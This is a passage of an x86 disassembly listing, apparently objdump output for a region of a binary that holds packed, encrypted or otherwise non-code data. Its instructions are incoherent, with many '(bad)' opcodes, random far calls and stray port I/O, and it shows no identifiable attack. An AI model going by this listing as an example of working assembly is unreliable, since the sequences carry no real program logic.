  419927:	mov    eax,0xb6212461
  41992c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41992d:	pop    es
  41992e:	jle    0x4198e8
  419930:	xor    al,0xae
  419933:	test   ch,dl
  419935:	inc    esp
  419936:	mov    al,ds:0x84a9b87a
  41993b:	dec    edx
  41993c:	xor    al,cl
  41993e:	fld    QWORD PTR [ebx]
  419940:	or     al,0xa4
  419942:	data16 cld 
  419944:	push   ebp
  419945:	test   eax,0x41a61c4f
  41994a:	add    ch,cl
  41994c:	and    al,BYTE PTR [edi-0x6f]
  41994f:	push   edi
  419950:	stc    
  419951:	jg     0x4199b1
  419953:	arpl   dx,di
  419955:	imul   eax,DWORD PTR [ecx+edi*8-0x69],0x9f89c708
  41995d:	or     al,cl
  41995f:	in     eax,0xad
  419961:	or     BYTE PTR [eax-0x5a],dh
  419964:	clc    
  419965:	into   
  419966:	pop    ds
  419967:	or     al,0x87
  419969:	and    BYTE PTR ds:0xf424f2f8,al
  41996f:	push   ebp
  419970:	mov    cl,0x1e
  419972:	add    al,0x19
  419974:	sbb    BYTE PTR [ebp-0x21481077],0xa9
  41997b:	adc    al,0x51
  41997d:	mov    ebp,0x27aa99b3
  419982:	call   0x2365:0x1edda34c
  419989:	dec    esi
  41998a:	out    dx,al
  41998b:	mov    ebx,0x12635407
  419990:	aam    0xa7
  419992:	xor    al,0x36
  419994:	pop    esi
  419995:	cmp    eax,0x3954d61c
  41999a:	and    esp,DWORD PTR [ebp-0x35]
  41999d:	and    BYTE PTR [esi+0x3d358630],0x34
  4199a4:	adc    ah,BYTE PTR [eax+0x1b3432a0]
  4199aa:	enter  0x2f39,0xa7
  4199ae:	xchg   ebp,eax
  4199af:	cwde   
  4199b0:	fadd   DWORD PTR [esi+0x56]
  4199b3:	(bad)  
  4199b4:	cmp    esi,0xd1004a2b
  4199ba:	lea    ecx,[edx-0x5a9e8a12]
  4199c0:	ins    BYTE PTR es:[edi],dx
  4199c1:	test   eax,edi
  4199c3:	cmp    edx,DWORD PTR [ebp+esi*4-0x77]
  4199c7:	fs xchg edi,eax
  4199c9:	retf   0x808
  4199cc:	dec    edi
  4199cd:	xchg   BYTE PTR [eax+0x5889f334],ch
  4199d3:	jmp    0x8403:0x3fb3bd1
  4199da:	sub    al,BYTE PTR [eax+edi*1+0x60a847f3]
  4199e1:	mov    bl,BYTE PTR [edx-0x755fdb47]
  4199e7:	stos   DWORD PTR es:[edi],eax
  4199e8:	pop    edx
  4199e9:	cmp    eax,0x329e2d09
  4199ee:	mov    esp,0xc7be88f9
  4199f3:	add    ecx,esp
  4199f5:	xchg   esp,eax
  4199f6:	sbb    eax,0x320653d7
  4199fb:	outs   dx,DWORD PTR ds:[esi]
  4199fc:	push   0xffffffbd
  4199fe:	or     DWORD PTR [edx+0x60],ebx
  419a01:	cmc    
  419a02:	(bad)  
  419a03:	repnz adc edx,DWORD PTR [edx]
  419a06:	and    al,BYTE PTR [ecx+0x31]
  419a09:	inc    DWORD PTR [ecx]
  419a0b:	imul   BYTE PTR [edi-0x18]
  419a0e:	cli    
  419a0f:	mov    edx,DWORD PTR [esi+0x573afd51]
  419a15:	in     eax,0xb6
  419a17:	fsubr  QWORD PTR [bp+si-0x3067]
  419a1c:	test   eax,0xd5f035f4
  419a21:	jne    0x4199f5
  419a23:	inc    ebx
  419a24:	sbb    DWORD PTR [eax+0x7a84c3e1],0x22
  419a2b:	inc    ecx
  419a2c:	imul   edx,DWORD PTR ds:0x85350e03,0xffffffab
  419a33:	fisttp WORD PTR [eax]
  419a35:	adc    eax,0x9d7d9899
  419a3a:	out    0xd2,al
  419a3c:	mov    edx,0x3e883b83
  419a41:	adc    DWORD PTR [esi-0x5c52415],eax
  419a47:	clc    
  419a48:	cdq    
  419a49:	push   ebp
  419a4a:	mov    bh,0x70
  419a4c:	aaa    
  419a4d:	jne    0x4199fd
  419a4f:	pop    es
  419a50:	xchg   esp,eax
  419a51:	fcmovnb st,st(5)
  419a53:	mov    WORD PTR [esi+0x368db6eb],ss
  419a59:	lahf   
  419a5a:	in     eax,dx
  419a5b:	jno    0x419a54
  419a5d:	mov    bl,dh
  419a5f:	cmp    eax,0x922e7df1
  419a64:	cmp    BYTE PTR [ecx-0x43],dl
  419a67:	std    
  419a68:	mov    bh,BYTE PTR [ecx+0x67fe108b]
  419a6e:	inc    edx
  419a6f:	aas    
  419a70:	cmp    DWORD PTR [ebp+0x73af5b42],edi
  419a76:	pop    esp
  419a77:	mov    ds:0x8f5c0fdc,eax
  419a7c:	leave  
  419a7d:	pop    edi
  419a7e:	jmp    FWORD PTR [ebx+0xeff40bb]
  419a84:	mov    DWORD PTR [eax+0x4a],ebx
  419a87:	jbe    0x419ac3
  419a89:	das    
  419a8a:	mov    al,ds:0x55b49915
  419a90:	jb     0x419a13
  419a92:	push   ss
  419a93:	xchg   ecx,eax
  419a94:	dec    edi
  419a95:	call   0xa37830b1
  419a9a:	sub    edi,DWORD PTR [ebx+0x16]
  419a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a9e:	out    0x3,eax
  419aa0:	lock mov esi,0x496ded41
  419aa6:	test   al,0x9
  419aa8:	mov    edi,0xba9a1164
  419aad:	xchg   ebx,eax
  419aae:	sub    DWORD PTR [eax+ecx*4+0x5d591eaf],ebp
  419ab5:	push   esi
  419ab6:	sbb    DWORD PTR [ebp-0x4],eax
  419ab9:	sbb    DWORD PTR [ebp+edi*8+0x7b],esi
  419abd:	and    eax,0xc159e64
  419ac2:	push   0xffffff88
  419ac4:	push   edi
  419ac5:	ret    0xe21e
  419ac8:	mov    edx,0x7ba5f81e
  419acd:	lods   eax,DWORD PTR ds:[esi]
  419ace:	cs jns 0x419b08
  419ad1:	int    0xe2
  419ad3:	call   0x9e56:0xbcbb054f
  419ada:	jp     0x419a7b
  419adc:	retf   
  419add:	adc    al,0x8d
  419adf:	addr16 pop ss
  419ae1:	jp     0x419add
  419ae3:	retf   
  419ae4:	inc    ebp
  419ae5:	mov    ecx,0x19e6a2a1
  419aea:	je     0x419a8f
  419aec:	xchg   ebp,eax
  419aed:	mov    ds,WORD PTR [edx+ecx*1-0x23]
  419af1:	scas   al,BYTE PTR es:[edi]
  419af2:	mov    ebp,esp
  419af4:	pop    esi
  419af5:	sub    al,0x4b
  419af7:	dec    edi
  419af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af9:	dec    edx
  419afa:	sub    DWORD PTR [ecx+eax*4],0xded324e5
  419b01:	call   0x7324ab3a
  419b06:	clc    
  419b07:	sub    BYTE PTR [ecx+0x58],dl
  419b0a:	mov    edi,gs
  419b0c:	int    0x46
  419b0e:	mov    eax,ds:0xd67dd7ab
  419b13:	(bad)  
  419b14:	jle    0x419b0d
  419b16:	call   DWORD PTR [esi-0x35461d6]
  419b1c:	add    bh,BYTE PTR ds:0x6a27d2cb
  419b22:	icebp  
  419b23:	cdq    
  419b24:	or     bh,BYTE PTR [esi-0x20]
  419b27:	lahf   
  419b28:	gs aad 0xa1
  419b2b:	sbb    ebp,DWORD PTR [edx-0x31d82bf9]
  419b31:	sub    DWORD PTR [eax+0x30],esi
  419b34:	cmp    al,0xc9
  419b36:	int3   
  419b37:	or     cl,ah
  419b39:	pushf  
  419b3a:	adc    BYTE PTR [edx-0x2fe775f1],bh
  419b40:	inc    edi
  419b41:	arpl   WORD PTR es:[esi-0x75],dx
  419b45:	and    eax,edx
  419b47:	jge    0x419ba6
  419b49:	lods   al,BYTE PTR ds:[esi]
  419b4a:	sub    al,0xa6
  419b4c:	hlt    
  419b4d:	in     al,dx
  419b4e:	adc    edx,ecx
  419b50:	or     eax,0x6d3d50e5
  419b55:	(bad)  
  419b56:	daa    
  419b57:	xchg   ebx,eax
  419b58:	(bad)  [esi-0x5e0e622d]
  419b5e:	sbb    ecx,DWORD PTR [ebp-0x27]
  419b61:	and    DWORD PTR [ebx+edi*4-0x6f354d6f],ebp
  419b68:	pop    eax
  419b69:	dec    esp
  419b6a:	adc    edi,DWORD PTR [ebx-0x15339633]
  419b70:	xor    ecx,edi
  419b72:	inc    DWORD PTR [edx+0x6d]
  419b75:	ins    DWORD PTR es:[edi],dx
  419b76:	hlt    
  419b77:	std    
  419b78:	or     ah,BYTE PTR [edx-0x60]
  419b7b:	retf   
  419b7c:	jl     0x419b05
  419b7e:	sbb    edi,edi
  419b80:	and    eax,0xaecf9488
  419b85:	jge    0x419b95
  419b87:	lock xlat BYTE PTR ds:[ebx]
  419b89:	pop    ecx
  419b8a:	idiv   BYTE PTR [edx+0x58]
  419b8d:	push   0xdc2bf37a
  419b92:	ret    
  419b93:	out    dx,eax
  419b94:	aad    0xe7
  419b96:	cmp    BYTE PTR [edi-0x72],ah
  419b99:	ret    
  419b9a:	into   
  419b9b:	and    eax,0x66ae45e8
  419ba0:	pop    ecx
  419ba1:	iret   
  419ba2:	hlt    
  419ba3:	cmp    eax,edi
  419ba5:	out    0xd4,eax
  419ba7:	lods   eax,DWORD PTR ds:[esi]
  419ba8:	pop    es
  419ba9:	jp     0x419bc8
  419bab:	add    eax,0x5b1d03d6
  419bb0:	mov    al,ds:0x2ea58b92
  419bb5:	jl     0x419bdf
  419bb7:	jne    0x419bb7
  419bb9:	int    0x8
  419bbb:	stos   DWORD PTR es:[edi],eax
  419bbc:	(bad)  
  419bbd:	adc    DWORD PTR [esi+0x5f6ccfb4],ebp
  419bc3:	pop    eax
  419bc4:	or     BYTE PTR ds:0xf4246810,ch
  419bca:	ja     0x419b57
  419bcc:	inc    ebp
  419bcd:	mov    esi,ebx
  419bcf:	jno    0x419bd3
  419bd1:	neg    DWORD PTR [esi-0x1fed14c9]
  419bd7:	jmp    0x419bd7
  419bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bda:	mov    BYTE PTR [edx-0x59b8a568],bh
  419be0:	lods   al,BYTE PTR ds:[esi]
  419be1:	mov    ds:0x6f9422a2,al
  419be6:	(bad)  
  419be7:	add    esp,DWORD PTR [ebx]
  419be9:	push   es
  419bea:	daa    
  419beb:	sbb    eax,DWORD PTR [eax+0x6ec71a93]
  419bf1:	or     BYTE PTR [edi],cl
  419bf3:	call   0x1d8d:0xa9e3ac7a
  419bfa:	cld    
  419bfb:	pop    ds
  419bfc:	lods   eax,DWORD PTR ds:[esi]
  419bfd:	sub    eax,DWORD PTR [bx+si-0x1c9b]
  419c02:	es mov dh,0x7f
  419c05:	push   ebx
  419c06:	aaa    
  419c07:	and    BYTE PTR [edx],ah
  419c09:	test   eax,0xc15e27a7
  419c0e:	mov    bh,0x4d
  419c10:	xchg   DWORD PTR [esi+0x4a],ebx
  419c13:	pop    ss
  419c14:	call   0x4030:0x52d4465c
  419c1b:	cmp    BYTE PTR [ebx+0x5b],al
  419c1e:	xchg   esp,eax
  419c1f:	in     eax,dx
  419c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c21:	leave  
  419c22:	dec    edx
  419c23:	xchg   esp,eax
  419c24:	shl    BYTE PTR [esp+ebx*1+0x6a0a7aae],cl
  419c2b:	mov    ebp,0x1c30a93c
  419c30:	loope  0x419c88
  419c32:	std    
  419c33:	jecxz  0x419bd6
  419c35:	jmp    0x9df1cabd
  419c3a:	into   
  419c3b:	sbb    eax,0xbb159dc8
  419c40:	mov    cl,0x75
  419c42:	ds dec ecx
  419c44:	gs lock aam 0xe2
  419c48:	sub    edi,esi
  419c4a:	add    al,0x87
  419c4c:	pop    ds
  419c4d:	mov    BYTE PTR [esi+0x46],dh
  419c50:	out    dx,eax
  419c51:	sbb    dh,dl
  419c53:	adc    DWORD PTR [eax],ebp
  419c55:	pop    ecx
  419c56:	retf   
  419c57:	scas   eax,DWORD PTR es:[edi]
  419c58:	jnp    0x419ca0
  419c5a:	pop    esi
  419c5b:	test   eax,0x4c60f93b
  419c60:	inc    edx
  419c61:	push   edi
  419c62:	xchg   BYTE PTR [ebp+0x6e07b234],al
  419c68:	xor    bh,BYTE PTR [ebx+eax*2+0x5fc5403f]
  419c6f:	add    eax,0xd8d7de8e
  419c74:	or     al,0x92
  419c76:	push   ebp
  419c77:	es adc bl,dl
  419c7a:	jle    0x419c7e
  419c7c:	push   esi
  419c7d:	fxch   st(3)
  419c7f:	or     eax,DWORD PTR es:[edx]
  419c82:	push   ds
  419c83:	ror    DWORD PTR [edi],0x3
  419c86:	out    0x39,eax
  419c88:	ins    DWORD PTR es:[edi],dx
  419c89:	mov    dl,0xe7
  419c8b:	int    0x60
  419c8d:	or     eax,0xdf57a5f0
  419c92:	sbb    DWORD PTR [edi-0x53],edi
  419c95:	js     0x419c4b
  419c97:	ja     0x419c3c
  419c99:	pop    esp
  419c9a:	mov    bl,0x8c
  419c9c:	push   esi
  419c9d:	jae    0x419cc6
  419c9f:	std    
  419ca0:	dec    esp
  419ca1:	in     al,dx
  419ca2:	mov    edi,0x71a58c40
  419ca7:	imul   edi,ebx,0xffffffac
  419caa:	sub    dl,BYTE PTR [ebp-0x38]
  419cad:	aam    0x87
  419caf:	enter  0x4658,0x86
  419cb3:	push   edi
  419cb4:	outs   dx,BYTE PTR ds:[esi]
  419cb5:	cdq    
  419cb6:	and    eax,DWORD PTR [ebp+esi*2+0x448f70ee]
  419cbd:	add    DWORD PTR [ebx-0x59],esp
  419cc0:	ret    0xee76
  419cc3:	jnp    0x419cbd
  419cc5:	ja     0x419c70
  419cc7:	int    0xf5
  419cc9:	xchg   ebp,eax
  419cca:	adc    al,0x91
  419ccc:	or     edi,ebx
  419cce:	jecxz  0x419c54
  419cd0:	xchg   ebx,eax
  419cd1:	pop    edx
  419cd2:	pop    edi
  419cd3:	jnp    0x419cd2
  419cd5:	pop    ebp
  419cd6:	dec    ebp
  419cd7:	pop    esi
  419cd8:	call   0xac560680
  419cdd:	dec    esi
  419cde:	mov    bl,0x60
  419ce0:	dec    esp
  419ce1:	in     eax,0x7d
  419ce3:	hlt    
  419ce4:	call   0xaaea273a
  419ce9:	push   eax
  419cea:	jmp    0x419cd8
  419cec:	(bad)  
  419cee:	mov    eax,0x7f2b7d7d
  419cf3:	ins    DWORD PTR es:[edi],dx
  419cf4:	ins    BYTE PTR es:[edi],dx
  419cf5:	inc    edx
  419cf6:	cdq    
  419cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cf8:	paddd  mm3,QWORD PTR [edi-0x45]
  419cfc:	push   es
  419cfd:	std    
  419cfe:	cli    
  419cff:	enter  0x4ba2,0x48
  419d03:	xor    DWORD PTR [ecx],0xffffffa9
  419d06:	in     al,dx
  419d07:	(bad)  
  419d08:	and    edx,DWORD PTR es:[ebp+0x65]
  419d0c:	adc    DWORD PTR [ecx],eax
  419d0e:	fwait
  419d0f:	jo     0x419cfd
  419d11:	ds mul al
  419d14:	stos   BYTE PTR es:[edi],al
  419d15:	jo     0x419d01
  419d17:	retf   0x16f9
  419d1a:	mov    al,ds:0x66aa98ed
  419d1f:	xchg   ebx,eax
  419d20:	xchg   edx,esp
  419d22:	jnp    0x419d20
  419d24:	outs   dx,BYTE PTR ds:[esi]
  419d25:	rcl    edi,1
  419d27:	jmp    ecx
  419d29:	sub    WORD PTR [ebx-0x33],cx
  419d2d:	or     cl,BYTE PTR [ecx-0x44c02245]
  419d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d34:	cld    
  419d35:	ja     0x419d93
  419d37:	jmp    0x624b16ca
  419d3c:	and    al,0x9e
  419d3e:	sub    esi,DWORD PTR [ebx]
  419d40:	inc    ebx
  419d41:	int3   
  419d42:	adc    eax,0xcbcfb34d
  419d47:	in     al,0x88
  419d49:	jmp    0x95e6490a
  419d4e:	push   edx
  419d4f:	test   BYTE PTR [ebp-0x42],bl
  419d52:	cmp    ebp,DWORD PTR [edi-0x39]
  419d55:	xchg   DWORD PTR [edx+0x60d432a9],edx
  419d5b:	mov    esi,0xd8f2606
  419d60:	push   ebx
  419d61:	pop    ecx
  419d62:	push   ebx
  419d63:	cmp    ecx,edi
  419d65:	lea    ebx,[edx+0x75]
  419d68:	sub    al,0x26
  419d6a:	jo     0x419d04
  419d6c:	(bad)  
  419d6d:	sahf   
  419d6e:	cmc    
  419d6f:	aas    
  419d70:	cmp    eax,0x1a13ef6c
  419d75:	jl     0x419dd7
  419d77:	pusha  
  419d78:	(bad)  
  419d79:	pop    ds
  419d7a:	jle    0x419da7
  419d7c:	in     eax,dx
  419d7d:	push   esp
  419d7e:	inc    ecx
  419d7f:	int3   
  419d80:	adc    BYTE PTR [ebx],dh
  419d82:	xchg   ecx,eax
  419d83:	(bad)  
  419d84:	dec    esi
  419d85:	mov    cl,0x97
  419d87:	gs out 0x7e,al
  419d8a:	das    
  419d8b:	pop    esp
  419d8c:	pop    ecx
  419d8d:	ss jg  0x419def
  419d90:	out    0x4c,eax
  419d92:	and    bl,BYTE PTR [edx-0x48f2ce81]
  419d98:	inc    ecx
  419d99:	mov    WORD PTR ds:0x3add0653,fs
  419d9f:	cmp    DWORD PTR [esi],ebp
  419da1:	ror    BYTE PTR [ecx+0x638981a6],0x6c
  419da8:	loopne 0x419d38
  419daa:	dec    ebx
  419dab:	lds    edi,FWORD PTR [eax+0x78]
  419dae:	jecxz  0x419d43
  419db0:	(bad)  
  419db1:	xlat   BYTE PTR ds:[ebx]
  419db2:	jo     0x419dc7
  419db4:	sbb    al,0x41
  419db6:	out    dx,al
  419db7:	jno    0x419d52
  419db9:	pusha  
  419dba:	jmp    0xc960f216
  419dbf:	lds    esp,FWORD PTR [esi]
  419dc1:	sub    bl,BYTE PTR [eax-0xd69a863]
  419dc7:	fsub   QWORD PTR [eax+0x64084077]
  419dcd:	jns    0x419e3a
  419dcf:	fcom   QWORD PTR [eax]
  419dd1:	mov    edx,0x46198948
  419dd6:	call   0xc914:0x797c0faa
  419ddd:	dec    edi
  419dde:	xor    esi,DWORD PTR [edi]
  419de0:	cdq    
  419de1:	sti    
  419de2:	out    dx,al
  419de3:	cmc    
  419de4:	cdq    
  419de5:	jecxz  0x419d7f
  419de7:	xchg   edx,eax
  419de8:	and    al,0x7a
  419dea:	xchg   edi,eax
  419deb:	shl    BYTE PTR [eax],cl
  419ded:	xor    DWORD PTR [ecx+edx*1-0x5f],esi
  419df1:	aas    
  419df2:	xor    al,0x35
  419df4:	jecxz  0x419e4e
  419df6:	fmul   DWORD PTR [esi]
  419df8:	xchg   ebp,eax
  419df9:	shl    BYTE PTR [ecx],1
  419dfb:	or     al,0xc3
  419dfd:	xchg   ecx,eax
  419dfe:	int    0xde
  419e00:	sub    al,0xfc
  419e02:	(bad)
  419e06:	add    ecx,DWORD PTR [edi]
  419e08:	je     0x419e25
  419e0a:	fmul   DWORD PTR [ecx+0x1]
  419e0d:	cmp    eax,0x12ce76a6
  419e12:	int    0x56
  419e14:	xchg   esp,eax
  419e15:	enter  0x61c0,0xcb
  419e19:	and    BYTE PTR es:[eax],ah
  419e1c:	(bad)  
  419e1d:	cwde   
  419e1e:	adc    BYTE PTR [ebp+0x5eff6c78],0x23
  419e25:	push   cs
  419e26:	mov    ch,BYTE PTR ds:0x9fb534aa
  419e2c:	adc    DWORD PTR ds:0xf50d5c3a,eax
  419e32:	add    eax,0x12b23e98
  419e37:	call   edx
  419e39:	add    edi,DWORD PTR [eax+0x5b29dc5]
  419e3f:	cld    
  419e40:	jne    0x419e43
  419e42:	inc    edi
  419e43:	cli    
  419e44:	xchg   ecx,eax
  419e45:	addr16 pop ebx
  419e47:	pushf  
  419e48:	scas   eax,DWORD PTR es:[edi]
  419e49:	aaa    
  419e4a:	mov    ebx,0x6a8f51f8
  419e4f:	pop    ds
  419e50:	stos   DWORD PTR es:[edi],eax
  419e51:	add    BYTE PTR [esi+esi*2+0x5e4c9ae0],dh
  419e58:	add    ebp,DWORD PTR [eax+0x5b]
  419e5b:	jl     0x419eaf
  419e5d:	push   ebx
  419e5e:	jno    0x419dfe
  419e60:	outs   dx,BYTE PTR ds:[esi]
  419e61:	inc    ebx
  419e62:	(bad)  
  419e64:	mov    al,ds:0x67410689
  419e69:	int    0x2d
  419e6b:	jmp    0x7ed4d73a
  419e70:	add    BYTE PTR [ebp-0x3c],0xf6
  419e74:	or     BYTE PTR [edi-0x32],al
  419e77:	inc    ecx
  419e78:	rcl    BYTE PTR [esi+0xf2018e1],1
  419e7e:	inc    ecx
  419e7f:	pop    edx
  419e80:	adc    ecx,esp
  419e82:	test   al,bl
  419e84:	les    esi,FWORD PTR [esi-0x10]
  419e87:	adc    ah,bh
  419e89:	dec    edx
  419e8a:	iret   
  419e8b:	push   0xb86c9607
  419e90:	sub    BYTE PTR [ebx],ch
  419e92:	xchg   ebp,eax
  419e93:	push   esi
  419e94:	jg     0x419ec1
  419e96:	and    eax,0xc62797b5
  419e9b:	push   eax
  419e9c:	push   edx
  419e9d:	fldcw  WORD PTR [edx+ebp*4-0x459f7082]
  419ea4:	cld    
  419ea5:	jb     0x419e28
  419ea7:	mov    edx,0x988a5ea4
  419eac:	mov    bh,0xb1
  419eae:	push   0x42
  419eb0:	mov    ecx,0xb238f506
  419eb5:	jg     0x419f26
  419eb7:	push   edi
  419eb8:	inc    edx
  419eb9:	xor    DWORD PTR [edi+0x18aaef87],eax
  419ebf:	in     eax,0xb8
  419ec1:	cmp    dl,al
  419ec3:	jnp    0x419e47
  419ec5:	push   ss
  419ec6:	xchg   ebx,eax
  419ec7:	push   eax
  419ec8:	jb     0x419eee
  419eca:	pop    edi
  419ecb:	dec    esi
  419ecc:	and    esi,0x63
  419ecf:	repnz rol DWORD PTR [ebx],cl
  419ed2:	stc    
  419ed3:	pop    ss
  419ed4:	push   esi
  419ed5:	mov    ecx,0xcb2d8b11
  419eda:	push   ebx
  419edb:	lds    esi,FWORD PTR [ecx]
  419edd:	xchg   edx,eax
  419ede:	xchg   edx,eax
  419edf:	inc    eax
  419ee0:	push   ss
  419ee1:	cmovg  edx,DWORD PTR [ebp-0x6b4cbb1b]
  419ee8:	fild   WORD PTR ds:0x336c9338
  419eee:	jmp    0x419edc
  419ef0:	div    BYTE PTR [ecx]
  419ef2:	sbb    DWORD PTR [eax-0x36a15483],esi
  419ef8:	sub    al,dl
  419efa:	out    dx,al
  419efb:	pushf  
  419efc:	ss xchg ebp,eax
  419efe:	xor    ebx,ebx
  419f00:	in     al,dx
  419f01:	arpl   WORD PTR [edx+0x9],sp
  419f04:	and    ebp,DWORD PTR [esp+ebx*4-0x23]
  419f08:	loop   0x419edc
  419f0a:	ficom  DWORD PTR [esi+0x28]
  419f0d:	xchg   ebp,eax
  419f0e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f10:	mov    eax,0xc50d56ac
  419f15:	push   cs
  419f16:	lods   eax,DWORD PTR ds:[esi]
  419f17:	dec    ecx
  419f18:	jne    0x419f4e
  419f1a:	jge    0x419f3c
  419f1c:	(bad)  
  419f1d:	and    eax,0x98ecddb0
  419f22:	aad    0xdc
  419f24:	sub    ecx,DWORD PTR [eax]
  419f26:	pop    ds
  419f27:	sbb    ah,dh
  419f29:	sahf   
  419f2a:	push   ecx
  419f2b:	out    0xe,eax
  419f2d:	or     edx,DWORD PTR [esp+edi*8]
  419f30:	and    bh,cl
  419f32:	ror    BYTE PTR [eax-0x37],1
  419f35:	xchg   ecx,eax
  419f36:	add    esi,ebx
  419f38:	dec    ebp
  419f39:	stos   DWORD PTR es:[edi],eax
  419f3a:	dec    esp
  419f3b:	sbb    eax,0x9b9f96fd
  419f40:	xchg   bp,ax
  419f42:	rcl    DWORD PTR [ecx+0x5b],cl
  419f45:	xor    BYTE PTR [esi],dl
  419f47:	inc    eax
  419f48:	mov    ah,0xdd
  419f4a:	pop    edx
  419f4b:	dec    ecx
  419f4c:	out    dx,eax
  419f4d:	push   edi
  419f4e:	fimul  DWORD PTR [esi+0x4b3b998d]
  419f54:	cmp    al,0xe8
  419f56:	cld    
  419f57:	pop    ecx
  419f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f59:	dec    ebp
  419f5a:	pop    edi
  419f5b:	or     al,0x50
  419f5d:	stos   BYTE PTR es:[edi],al
  419f5e:	pop    eax
  419f5f:	cdq    
  419f60:	popf   
  419f61:	fdiv   DWORD PTR [esi-0x5d]
  419f64:	jmp    0x419fa2
  419f66:	jae    0x419fb2
  419f68:	jg     0x419f82
  419f6a:	push   eax
  419f6b:	mov    dl,0x22
  419f6d:	aas    
  419f6e:	jg     0x419faf
  419f70:	push   edx
  419f71:	lahf   
  419f72:	jmp    0x419ef7
  419f74:	out    0xf6,eax
  419f76:	sbb    al,0xf1
  419f78:	fld    DWORD PTR [ebp+0x9cb2839]
  419f7e:	call   0x17ed:0x36b0076c
  419f85:	and    bh,BYTE PTR [ebx]
  419f87:	mov    cl,BYTE PTR [ebp+0xb]
  419f8a:	pop    esp
  419f8b:	jp     0x419f90
  419f8d:	arpl   WORD PTR [ebp-0x20d6ad9c],dx
  419f93:	sub    dl,BYTE PTR [eax+0x33]
  419f96:	cs ss retf 
  419f99:	sub    BYTE PTR [ebp-0x56],dh
  419f9c:	mov    bh,0x54
  419f9e:	sub    edi,edx
  419fa0:	outs   dx,DWORD PTR ds:[esi]
  419fa1:	int    0xfd
  419fa3:	jne    0x419fb5
  419fa5:	xchg   DWORD PTR [edx+0x7e],esi
  419fa8:	mov    eax,esi
  419faa:	(bad)  
  419fab:	pop    esi
  419fac:	and    al,0xb3
  419fae:	popa   
  419faf:	shl    cl,0xff
  419fb2:	je     0x419fb3
  419fb4:	pusha  
  419fb5:	mov    dh,0x9d
  419fb7:	cld    
  419fb8:	mov    esi,eax
  419fba:	mov    BYTE PTR ds:0x92ea2ddb,ch
  419fc0:	sbb    al,0xb7
  419fc2:	cs gs pushf 
  419fc5:	xchg   ecx,eax
  419fc6:	inc    esi
  419fc7:	fmulp  st(0),st
  419fc9:	push   eax
  419fca:	cli    
  419fcb:	mov    ?,WORD PTR [ebx+0x5b5939fe]
  419fd1:	xchg   BYTE PTR [ecx],dh
  419fd3:	cmp    eax,0x45a4c59d
  419fd8:	mov    gs,ebx
  419fda:	rcl    DWORD PTR [esi+ebp*2-0x76],1
  419fde:	cmp    eax,DWORD PTR [ecx]
  419fe0:	call   0x18e1f853
  419fe5:	iret   
  419fe6:	xchg   ebx,eax
  419fe7:	pop    ebp
  419fe8:	fisub  DWORD PTR [ecx]
  419fea:	push   es
  419feb:	iret   
  419fec:	ret    
  419fed:	into   
  419fee:	cs xchg ebx,eax
  419ff0:	fadd   st,st(1)
  419ff2:	mov    dl,0x49
  419ff4:	ss loopne 0x41a000
  419ff7:	fmulp  st(2),st
  419ff9:	rol    DWORD PTR [ebx+0x51],0x8a
  419ffd:	ins    DWORD PTR es:[edi],dx
  419ffe:	fdiv   st,st(2)
  41a000:	sbb    DWORD PTR [ecx+0x6a],ebp
  41a003:	sbb    DWORD PTR [edi-0x78d72836],esi
  41a009:	adc    eax,0x9798d4dd
  41a00e:	inc    ecx
  41a00f:	push   ecx
  41a010:	add    al,0x49
  41a012:	clc    
  41a013:	cld    
  41a014:	(bad)  
  41a015:	pop    ds
  41a016:	inc    eax
  41a017:	jae    0x41a086
  41a019:	push   0xffffffb9
  41a01b:	in     eax,0x91
  41a01d:	iret   
  41a01e:	sbb    eax,0x4f22f043
  41a023:	stc    
  41a024:	fsub   DWORD PTR [ecx]
  41a026:	(bad)  
  41a027:	pushf  
  41a028:	cdq    
  41a029:	and    eax,0x3d77f8d3
  41a02e:	lods   eax,DWORD PTR ds:[esi]
  41a02f:	pop    edi
  41a030:	xchg   ebp,eax
  41a031:	jle    0x419fef
  41a033:	pop    eax
  41a034:	pop    ecx
  41a035:	mov    cl,0xe9
  41a037:	inc    ecx
  41a038:	add    al,0xcc
  41a03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a03d:	les    edx,FWORD PTR [eax+0x17ac9959]
  41a043:	dec    ecx
  41a044:	adc    DWORD PTR [eax+0x59c2b408],esp
  41a04a:	neg    BYTE PTR [edi-0x43]
  41a04d:	add    DWORD PTR [ecx],eax
  41a04f:	les    edi,FWORD PTR [edi+ebx*8-0x30ad056a]
  41a056:	xchg   BYTE PTR [ebx+ebx*8-0x355dae8c],dl
  41a05d:	int    0x2a
  41a05f:	mov    al,ds:0x306d0c3d
  41a064:	sbb    ebx,DWORD PTR [esi+0x6098a96f]
  41a06a:	pop    ebx
  41a06b:	add    ch,BYTE PTR [ebx]
  41a06d:	int    0xe5
  41a06f:	cmp    al,0xa5
  41a071:	mov    dh,0xc4
  41a073:	xchg   edi,eax
  41a074:	mov    cl,BYTE PTR [esi]
  41a076:	jo     0x41a08d
  41a078:	loopne 0x41a055
  41a07a:	push   esp
  41a07b:	or     eax,eax
  41a07d:	mov    esp,0xaee812db
  41a082:	mov    BYTE PTR [eax+esi*2-0x2732e9fb],ah
  41a089:	imul   ebx,DWORD PTR [ebx],0xffffffb1
  41a08c:	(bad)  
  41a08d:	aaa    
  41a08e:	call   0xed59d1cd
  41a093:	loopne 0x41a091
  41a095:	repz add al,0xdd
  41a098:	lahf   
  41a099:	fwait
  41a09a:	xchg   DWORD PTR ds:0xba150e1a,edx
  41a0a0:	push   0x7a
  41a0a2:	push   es
  41a0a3:	retf   0x203f
  41a0a6:	dec    edx
  41a0a7:	dec    ebp
  41a0a8:	and    al,0xc3
  41a0aa:	inc    esp
  41a0ab:	je     0x41a09c
  41a0ad:	dec    esp
  41a0ae:	mov    WORD PTR [esi-0x26d99a4d],fs
  41a0b4:	(bad)  
  41a0b5:	xor    ch,al
  41a0b7:	sub    ch,dl
